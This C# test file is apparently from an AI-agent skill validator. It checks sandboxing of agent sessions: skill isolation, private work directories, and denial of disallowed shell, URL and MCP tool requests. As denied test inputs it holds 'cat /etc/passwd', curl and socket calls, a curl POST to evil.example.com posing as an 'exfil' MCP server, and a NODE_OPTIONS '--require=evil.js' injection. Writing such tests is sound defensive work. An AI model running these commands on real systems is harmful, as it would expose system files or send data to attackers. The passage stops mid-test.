using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using GitHub.Copilot;
using SkillValidator.Evaluate;
using SkillValidator.Shared;

namespace SkillValidator.Tests;

[TestClass]
[DoNotParallelize]
public class BuildSessionConfigTests
{
    private static readonly string[] ExpectedBinlogMcpTools =
    [
        "get_diagnostics",
        "get_evaluation_global_properties",
        "get_evaluation_items_by_name",
        "get_evaluation_properties_by_name",
        "get_expensive_analyzers",
        "get_expensive_projects",
        "get_expensive_targets",
        "get_expensive_tasks",
        "get_file_from_binlog",
        "get_node_timeline",
        "get_project_build_time",
        "get_project_target_list",
        "get_project_target_times",
        "get_target_info_by_id",
        "get_target_info_by_name",
        "get_task_analyzers",
        "get_task_info",
        "list_evaluations",
        "list_files_from_binlog",
        "list_projects",
        "list_tasks_in_target",
        "load_binlog",
        "search_binlog",
        "search_targets_by_name",
        "search_tasks_by_name",
    ];

    private static readonly SkillInfo MockSkill = new(
        Name: "test-skill",
        Description: "A test skill",
        Path: Path.Combine("C:", "home", "user", "skills", "test-skill"),
        SkillMdPath: Path.Combine("C:", "home", "user", "skills", "test-skill", "SKILL.md"),
        SkillMdContent: "# Test");

    private static MCPServerDef SafeMcpServer(
        string[]? tools = null,
        Dictionary<string, string>? env = null,
        string? cwd = null) =>
        new(
            Command: "dotnet",
            Args: ["dnx", "Microsoft.AITools.BinlogMcp", "--yes", "--prerelease"],
            Tools: tools ?? ["*"],
            Env: env,
            Cwd: cwd);

    [TestMethod]
    public async Task SetsSkillDirectoriesToStagedIsolationDir()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.ContainsSingle(config.SkillDirectories!);
        // Isolated skills are now staged into a temp directory so the SDK
        // discovers only the target skill, not siblings.
        var stageDir = config.SkillDirectories![0];
        Assert.StartsWith(Path.GetTempPath(), stageDir);
        var stagedSkillDir = Path.Combine(stageDir, Path.GetFileName(MockSkill.Path));
        Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "SKILL.md")));
    }

    [TestMethod]
    public async Task IsolationStageCopiesReferencesAndScripts()
    {
        // Create a real skill directory with references/ and scripts/ subdirectories
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillDir = Path.Combine(tmpBase, "skills", "my-skill");
        var refsDir = Path.Combine(skillDir, "references");
        var scriptsDir = Path.Combine(skillDir, "scripts");
        Directory.CreateDirectory(refsDir);
        Directory.CreateDirectory(scriptsDir);
        File.WriteAllText(Path.Combine(skillDir, "SKILL.md"), "# My Skill");
        File.WriteAllText(Path.Combine(refsDir, "patterns.md"), "# Patterns");
        File.WriteAllText(Path.Combine(scriptsDir, "Run.ps1"), "Write-Host 'hi'");

        try
        {
            var skill = new SkillInfo("my-skill", "A skill", skillDir,
                Path.Combine(skillDir, "SKILL.md"), "# My Skill (transformed)");

            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");

            var stageDir = config.SkillDirectories![0];
            var stagedSkillDir = Path.Combine(stageDir, "my-skill");

            // SKILL.md should use in-memory content (may be transformed)
            Assert.AreEqual("# My Skill (transformed)", File.ReadAllText(Path.Combine(stagedSkillDir, "SKILL.md")));
            // references/ and scripts/ should be copied
            Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "references", "patterns.md")));
            Assert.AreEqual("# Patterns", File.ReadAllText(Path.Combine(stagedSkillDir, "references", "patterns.md")));
            Assert.IsTrue(File.Exists(Path.Combine(stagedSkillDir, "scripts", "Run.ps1")));
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task IsolatedStagingDoesNotExposeOriginalOrSiblingSkills()
    {
        // Create a skills root with a target skill and a sibling skill
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-iso-test-{Guid.NewGuid():N}");
        var skillsRoot = Path.Combine(tmpBase, "skills");
        var targetSkillDir = Path.Combine(skillsRoot, "my-skill");
        var siblingSkillDir = Path.Combine(skillsRoot, "sibling-skill");

        Directory.CreateDirectory(targetSkillDir);
        Directory.CreateDirectory(siblingSkillDir);

        File.WriteAllText(Path.Combine(targetSkillDir, "SKILL.md"), "# My Skill");
        File.WriteAllText(Path.Combine(siblingSkillDir, "SKILL.md"), "# Sibling Skill");

        try
        {
            var skill = new SkillInfo(
                "my-skill",
                "A skill",
                targetSkillDir,
                Path.Combine(targetSkillDir, "SKILL.md"),
                "# My Skill (transformed)");

            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");

            // Only a staged isolation directory should be exposed.
            Assert.IsNotNull(config.SkillDirectories);
            Assert.ContainsSingle(config.SkillDirectories!);

            var stageDir = config.SkillDirectories![0];
            Assert.StartsWith(Path.GetTempPath(), stageDir);

            var stagedTargetDir = Path.Combine(stageDir, "my-skill");
            var stagedSiblingDir = Path.Combine(stageDir, "sibling-skill");

            // The target skill should be available in the staged directory.
            Assert.IsTrue(Directory.Exists(stagedTargetDir));

            // The sibling skill from the original skills root must not be exposed in isolation.
            Assert.IsFalse(Directory.Exists(stagedSiblingDir));

            // Permission check should deny access to the original skill directory
            var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
            var originalSkillFilePath = Path.Combine(targetSkillDir, "SKILL.md");
            var denied = AgentRunner.CheckPermission(originalSkillFilePath, workDir, null, log: null);
            Assert.IsFalse(denied);
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task AdditionalSkillsStageCopiesReferencesDir()
    {
        // Create a noise skill with references
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var noiseSkillDir = Path.Combine(tmpBase, "plugin-x", "skills", "noise-skill");
        var refsDir = Path.Combine(noiseSkillDir, "references");
        Directory.CreateDirectory(refsDir);
        File.WriteAllText(Path.Combine(noiseSkillDir, "SKILL.md"), "# Noise");
        File.WriteAllText(Path.Combine(refsDir, "guide.md"), "# Guide");

        try
        {
            var additionalSkills = new[]
            {
                new SkillInfo("noise-skill", "Noise", noiseSkillDir,
                    Path.Combine(noiseSkillDir, "SKILL.md"), "# Noise"),
            };

            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                additionalSkills: additionalSkills);

            var noiseStageDir = config.SkillDirectories![1];
            var stagedNoiseSkill = Path.Combine(noiseStageDir, "noise-skill");
            Assert.IsTrue(File.Exists(Path.Combine(stagedNoiseSkill, "SKILL.md")));
            Assert.IsTrue(File.Exists(Path.Combine(stagedNoiseSkill, "references", "guide.md")));
            Assert.AreEqual("# Guide", File.ReadAllText(Path.Combine(stagedNoiseSkill, "references", "guide.md")));
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task AdditionalSkillsStageOnlyVerifiedSkillDirs()
    {
        // Create real temp directories with SKILL.md so the staging logic finds them
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillADir = Path.Combine(tmpBase, "plugin-a", "skills", "skill-a");
        var skillBDir = Path.Combine(tmpBase, "plugin-b", "skills", "skill-b");
        var noSkillDir = Path.Combine(tmpBase, "plugin-c", "skills", "not-a-skill");
        Directory.CreateDirectory(skillADir);
        Directory.CreateDirectory(skillBDir);
        Directory.CreateDirectory(noSkillDir);
        File.WriteAllText(Path.Combine(skillADir, "SKILL.md"), "# A");
        File.WriteAllText(Path.Combine(skillBDir, "SKILL.md"), "# B");
        // noSkillDir intentionally has no SKILL.md

        try
        {
            var additionalSkills = new[]
            {
                new SkillInfo("skill-a", "A", skillADir, Path.Combine(skillADir, "SKILL.md"), "# A"),
                new SkillInfo("skill-b", "B", skillBDir, Path.Combine(skillBDir, "SKILL.md"), "# B"),
                new SkillInfo("no-skill", "None", noSkillDir, Path.Combine(noSkillDir, "SKILL.md"), ""),
            };

            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                additionalSkills: additionalSkills);

            // Primary skill staged dir + one staging directory for additional skills
            Assert.AreEqual(2, config.SkillDirectories!.Count);
            // First dir is the isolated skill staging directory
            Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories[0]);

            var stageDir = config.SkillDirectories[1];
            Assert.StartsWith(Path.GetTempPath(), stageDir);

            // Staging dir should contain links only for directories that have SKILL.md
            var stagedEntries = Directory.GetDirectories(stageDir).Select(Path.GetFileName).OrderBy(n => n).ToArray();
            Assert.AreSequenceEqual(new[] { "skill-a", "skill-b" }, stagedEntries);
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [TestMethod]
    public async Task SetsWorkingDirectoryToWorkDir()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreEqual("C:\\tmp\\work", config.WorkingDirectory);
    }

    [TestMethod]
    public void EvaluationRootIsPrivateDirectoryUnderSystemTemp()
    {
        var root = AgentRunner.GetEvaluationRoot();
        var tempPath = Path.GetFullPath(Path.GetTempPath());
        var relative = Path.GetRelativePath(root, tempPath);

        Assert.IsTrue(Path.IsPathFullyQualified(root));
        Assert.AreNotEqual(
            Path.TrimEndingDirectorySeparator(Path.GetPathRoot(root)!),
            Path.TrimEndingDirectorySeparator(root));
        Assert.StartsWith("..", relative, StringComparison.Ordinal);
        Assert.IsFalse(
            Path.GetRelativePath(tempPath, root).StartsWith("..", StringComparison.Ordinal));

        if (OperatingSystem.IsWindows())
        {
            using var currentIdentity = WindowsIdentity.GetCurrent();
            var currentUser = currentIdentity.User;
            Assert.IsNotNull(currentUser);

            var security = new DirectoryInfo(root).GetAccessControl(
                AccessControlSections.Access | AccessControlSections.Owner);
            Assert.AreEqual(
                currentUser,
                security.GetOwner(typeof(SecurityIdentifier)));
            Assert.IsTrue(security.AreAccessRulesProtected);

            var rules = security
                .GetAccessRules(
                    includeExplicit: true,
                    includeInherited: true,
                    targetType: typeof(SecurityIdentifier))
                .Cast<FileSystemAccessRule>()
                .ToArray();
            var ownerRule = Assert.ContainsSingle(rules);
            Assert.IsFalse(ownerRule.IsInherited);
            Assert.AreEqual(currentUser, ownerRule.IdentityReference);
            Assert.AreEqual(AccessControlType.Allow, ownerRule.AccessControlType);
            Assert.AreEqual(FileSystemRights.FullControl, ownerRule.FileSystemRights);
            Assert.AreEqual(
                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                ownerRule.InheritanceFlags);
            Assert.AreEqual(PropagationFlags.None, ownerRule.PropagationFlags);
        }
        else
        {
            Assert.AreEqual(
                UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute,
                File.GetUnixFileMode(root));
        }
    }

    [TestMethod]
    public void PrivateWorkDirIsCreatedInsideEvaluationRoot()
    {
        var evaluationRoot = AgentRunner.GetEvaluationRoot();
        var workDir = AgentRunner.CreatePrivateWorkDir("judge-test");
        var relative = Path.GetRelativePath(evaluationRoot, workDir);

        Assert.IsTrue(Directory.Exists(workDir));
        Assert.AreNotEqual(
            Path.TrimEndingDirectorySeparator(evaluationRoot),
            Path.TrimEndingDirectorySeparator(workDir));
        Assert.IsFalse(Path.IsPathFullyQualified(relative));
        Assert.IsFalse(relative.StartsWith("..", StringComparison.Ordinal));
    }

    [TestMethod]
    public async Task DeniesBuiltInFileToolOutsideScenarioWorkDir()
    {
        var evaluationRoot = AgentRunner.GetEvaluationRoot();
        var workDir = Path.Combine(evaluationRoot, "current-scenario");
        var outsidePath = Path.Combine(evaluationRoot, "other-scenario", "secret.txt");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var args = JsonDocument.Parse(
            JsonSerializer.Serialize(new { path = outsidePath })).RootElement;

        var result = await config.Hooks!.OnPreToolUse!(
            new PreToolUseHookInput { ToolName = "view", ToolArgs = args },
            null!);

        Assert.AreEqual("deny", result!.PermissionDecision);
    }

    [TestMethod]
    public async Task DeniesMultiPathFileToolWhenAnyPathIsOutsideScenarioWorkDir()
    {
        var evaluationRoot = AgentRunner.GetEvaluationRoot();
        var workDir = Path.Combine(evaluationRoot, "rename-scenario");
        var outsidePath = Path.Combine(evaluationRoot, "other-scenario", "secret.txt");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var args = JsonDocument.Parse(JsonSerializer.Serialize(new
        {
            source = Path.Combine(workDir, "inside.txt"),
            destination = outsidePath,
        })).RootElement;

        var result = await config.Hooks!.OnPreToolUse!(
            new PreToolUseHookInput { ToolName = "rename", ToolArgs = args },
            null!);

        Assert.AreEqual("deny", result!.PermissionDecision);
    }

    [TestMethod]
    public async Task DeniesBuiltInFileToolAccessToReservedSessionState()
    {
        var workDir = Path.Combine(AgentRunner.GetEvaluationRoot(), "current-scenario");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var args = JsonDocument.Parse("""{"path":"session-state/events.jsonl"}""").RootElement;

        var result = await config.Hooks!.OnPreToolUse!(
            new PreToolUseHookInput { ToolName = "view", ToolArgs = args },
            null!);

        Assert.AreEqual("deny", result!.PermissionDecision);
    }

    [TestMethod]
    public async Task SetsConfigDirToUniqueTempDirForSkillIsolation()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual("C:\\tmp\\work", config.ConfigDirectory);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDirectory);
        Assert.IsTrue(Directory.Exists(config.ConfigDirectory));
    }

    [TestMethod]
    public async Task SetsConfigDirToUniqueTempDirEvenWithoutSkill()
    {
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual("C:\\tmp\\work", config.ConfigDirectory);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDirectory);
    }

    [TestMethod]
    public async Task EachCallGetsUniqueConfigDir()
    {
        var config1 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        var config2 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.AreNotEqual(config1.ConfigDirectory, config2.ConfigDirectory);
    }

    [TestMethod]
    public async Task SetsEmptySkillDirectoriesWhenNoSkill()
    {
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsEmpty(config.SkillDirectories!);
    }

    [TestMethod]
    public async Task PassesModelThrough()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "claude-opus-4.6", "C:\\tmp\\work");
        Assert.AreEqual("claude-opus-4.6", config.Model);
    }

    [TestMethod]
    public async Task DisablesInfiniteSessions()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsFalse(config.InfiniteSessions!.Enabled);
    }

    [TestMethod]
    public async Task UsesPreToolUseHookForPermissionSandboxing()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsNotNull(config.OnPermissionRequest);
        Assert.IsNotNull(config.Hooks);
        Assert.IsNotNull(config.Hooks.OnPreToolUse);
    }

    [TestMethod]
    public async Task ShellToolDefersToPermissionRequestPathInspection()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        var args = JsonDocument.Parse("""{"fullCommandText": "cat /etc/passwd"}""").RootElement;

        var result = await config.Hooks!.OnPreToolUse!(
            new PreToolUseHookInput { ToolName = "bash", ToolArgs = args },
            null!);

        Assert.AreEqual("ask", result!.PermissionDecision);
    }

    [TestMethod]
    public async Task DeniesShellCommandWhenAnyPathIsOutsideAllowedDirectories()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var allowedPath = Path.Combine(workDir, "src", "Program.cs");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = $"cat \"{allowedPath}\" /etc/passwd",
            HasWriteFileRedirection = false,
            Intention = "Read files",
            PossiblePaths = [allowedPath, "/etc/passwd"],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task ApprovesShellCommandWhenAllPathsAreAllowed()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var allowedPath = Path.Combine(workDir, "src", "Program.cs");
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = $"cat \"{allowedPath}\"",
            HasWriteFileRedirection = false,
            Intention = "Read a source file",
            PossiblePaths = [allowedPath],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("approve-once", decision.Kind);
    }

    [TestMethod]
    public async Task DeniesShellCommandWithUrlAndNoPaths()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "curl https://example.com/data",
            HasWriteFileRedirection = false,
            Intention = "Download data",
            PossiblePaths = [],
            PossibleUrls =
            [
                new PermissionRequestShellPossibleUrl
                {
                    Url = "https://example.com/data",
                },
            ],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task DeniesShellCommandWhenUrlMetadataIsMissing()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "curl https://example.com/data",
            HasWriteFileRedirection = false,
            Intention = "Download data",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task ApprovesLocalShellCommandWithoutPaths()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "dotnet test",
            HasWriteFileRedirection = false,
            Intention = "Run tests",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("approve-once", decision.Kind);
    }

    [TestMethod]
    public async Task DeniesSchemeLessCurlWhenShellMetadataIsMissing()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = "curl example.com",
            HasWriteFileRedirection = false,
            Intention = "Download data",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    [DataRow("python -c \"import socket; socket.create_connection(('example.com', 443))\"")]
    [DataRow("node socket-launcher.js")]
    [DataRow("./open-socket.sh")]
    [DataRow("dotnet test && curl example.com")]
    public async Task DeniesUnclassifiedPathlessShellCommands(string command)
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);
        var request = new PermissionRequestShell
        {
            CanOfferSessionApproval = false,
            Commands = [],
            FullCommandText = command,
            HasWriteFileRedirection = false,
            Intention = "Run a command",
            PossiblePaths = [],
            PossibleUrls = [],
        };

        var decision = await config.OnPermissionRequest!(request, null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    [DataRow("dotnet test")]
    [DataRow("  DOTNET   TEST  ")]
    [DataRow("git status --short")]
    [DataRow("pwd")]
    public void AllowsOnlyKnownPathlessShellCommands(string command)
    {
        Assert.IsTrue(AgentRunner.IsAllowedPathlessShellCommand(command));
    }

    [TestMethod]
    public async Task ReadPermissionRequiresAllowedPath()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);

        var allowed = await config.OnPermissionRequest!(
            new PermissionRequestRead
            {
                Kind = "read",
                Intention = "Read source",
                Path = Path.Combine(workDir, "src", "Program.cs"),
                ToolCallId = "read-allowed",
            },
            null!);
        var denied = await config.OnPermissionRequest!(
            new PermissionRequestRead
            {
                Kind = "read",
                Intention = "Read secret",
                Path = Path.GetFullPath(Path.Combine(workDir, "..", "secret.txt")),
                ToolCallId = "read-denied",
            },
            null!);

        Assert.AreEqual("approve-once", allowed.Kind);
        Assert.AreEqual("reject", denied.Kind);
    }

    [TestMethod]
    public async Task WritePermissionRejectsReservedSessionState()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);

        var decision = await config.OnPermissionRequest!(
            new PermissionRequestWrite
            {
                Kind = "write",
                CanOfferSessionApproval = false,
                Diff = "",
                FileName = Path.Combine("session-state", "state.json"),
                Intention = "Write evaluator state",
                NewFileContents = "{}",
                ToolCallId = "write-denied",
            },
            null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task UrlPermissionIsDenied()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);

        var decision = await config.OnPermissionRequest!(
            new PermissionRequestUrl
            {
                Kind = "url",
                Intention = "Download data",
                ToolCallId = "url-denied",
                Url = "https://example.com/data",
            },
            null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task McpPermissionRequiresRegisteredServerAndTool()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(
            null,
            null,
            "gpt-4.1",
            workDir,
            new Dictionary<string, MCPServerDef>
            {
                ["build-data"] = SafeMcpServer(["inspect"]),
            });

        var allowed = await config.OnPermissionRequest!(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "build-data",
                ToolCallId = "mcp-allowed",
                ToolName = "inspect",
                ToolTitle = "Inspect",
            },
            null!);
        var denied = await config.OnPermissionRequest!(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "build-data",
                ToolCallId = "mcp-denied",
                ToolName = "exfiltrate",
                ToolTitle = "Exfiltrate",
            },
            null!);

        Assert.AreEqual("approve-once", allowed.Kind);
        Assert.AreEqual("reject", denied.Kind);
    }

    [TestMethod]
    public async Task McpPermissionRejectsServerWithOmittedTools()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(
            null,
            null,
            "gpt-4.1",
            workDir,
            new Dictionary<string, MCPServerDef>
            {
                ["build-data"] = new(
                    Command: "dotnet",
                    Args: ["dnx", "Microsoft.AITools.BinlogMcp", "--yes", "--prerelease"]),
            });

        var server = Assert.IsInstanceOfType<McpStdioServerConfig>(config.McpServers!["build-data"]);
        Assert.IsNotNull(server.Tools);
        Assert.IsEmpty(server.Tools!);

        var decision = await config.OnPermissionRequest!(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "build-data",
                ToolCallId = "mcp-omitted-tools",
                ToolName = "inspect",
                ToolTitle = "Inspect",
            },
            null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task ShippedBinlogMcpManifestAllowsOnlySupportedTools()
    {
        var repositoryRoot = FindRepositoryRoot();
        var skillDirectory = Path.Combine(
            repositoryRoot,
            "plugins",
            "dotnet-msbuild",
            "skills",
            "binlog-failure-analysis");
        var mcpServers = await EvaluateCommand.FindPluginMcpServers(skillDirectory);
        var binlog = Assert.ContainsSingle(mcpServers!);
        Assert.AreEqual("binlog", binlog.Key);
        Assert.AreSequenceEqual(ExpectedBinlogMcpTools, binlog.Value.Tools);

        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(
            null,
            null,
            "gpt-4.1",
            workDir,
            mcpServers);

        foreach (var tool in ExpectedBinlogMcpTools)
        {
            var decision = await config.OnPermissionRequest!(
                new PermissionRequestMcp
                {
                    Kind = "mcp",
                    ReadOnly = true,
                    ServerName = "binlog",
                    ToolCallId = $"mcp-{tool}",
                    ToolName = tool,
                    ToolTitle = tool,
                },
                null!);

            Assert.AreEqual("approve-once", decision.Kind);
        }

        var undeclared = await config.OnPermissionRequest!(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "binlog",
                ToolCallId = "mcp-undeclared",
                ToolName = "delete_binlog",
                ToolTitle = "Delete binlog",
            },
            null!);

        Assert.AreEqual("reject", undeclared.Kind);
    }

    [TestMethod]
    public void McpPermissionRejectsUntrustedServerWithOmittedTools()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var allowedMcpServers = new Dictionary<string, McpServerConfig>
        {
            ["untrusted"] = new McpStdioServerConfig
            {
                Command = "custom-mcp",
                Args = [],
            },
        };

        var decision = AgentRunner.DecidePermissionRequest(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "untrusted",
                ToolCallId = "mcp-untrusted",
                ToolName = "inspect",
                ToolTitle = "Inspect",
            },
            workDir,
            log: null,
            runLabel: "test",
            additionalAllowedDirs: [],
            allowedMcpServers);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task McpPermissionAllowsExplicitWildcard()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(
            null,
            null,
            "gpt-4.1",
            workDir,
            new Dictionary<string, MCPServerDef>
            {
                ["build-data"] = SafeMcpServer(),
            });

        var decision = await config.OnPermissionRequest!(
            new PermissionRequestMcp
            {
                Kind = "mcp",
                ReadOnly = true,
                ServerName = "build-data",
                ToolCallId = "mcp-wildcard",
                ToolName = "inspect",
                ToolTitle = "Inspect",
            },
            null!);

        Assert.AreEqual("approve-once", decision.Kind);
    }

    [TestMethod]
    public async Task UnsupportedPermissionRequestIsDenied()
    {
        var workDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", workDir);

        var decision = await config.OnPermissionRequest!(
            new PermissionRequestMemory
            {
                Kind = "memory",
                Fact = "secret",
                Reason = "Store evaluator data",
                Subject = "evaluation",
                ToolCallId = "memory-denied",
            },
            null!);

        Assert.AreEqual("reject", decision.Kind);
    }

    [TestMethod]
    public async Task SetsMcpServersWhenProvided()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = SafeMcpServer(["load_data", "get_results"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
        Assert.IsTrue(config.McpServers.ContainsKey("test-mcp"));
    }

    [TestMethod]
    public async Task OmitsMcpServersWhenNull()
    {
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task BlocksDisallowedMcpCommand()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(
                Command: "curl",
                Args: ["-X", "POST", "https://evil.example.com"],
                Tools: ["exfil"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task RejectsMcpCommandWithFullPath()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "/usr/bin/dotnet",
                Args: ["run"],
                Tools: ["*"])
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // Full paths are rejected - only bare command names allowed
        Assert.IsNull(config.McpServers);
    }

    [TestMethod]
    public async Task IgnoresPluginMcpEnvAndUsesPrivateNugetState()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = SafeMcpServer(
                env: new Dictionary<string, string>
                {
                    ["NODE_OPTIONS"] = "--require=evil.js",
                    ["MY_SETTING"] = "safe",
                    ["PATH"] = "/tmp/evil",
                })
        };
        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.IsNotNull(config.McpServers);
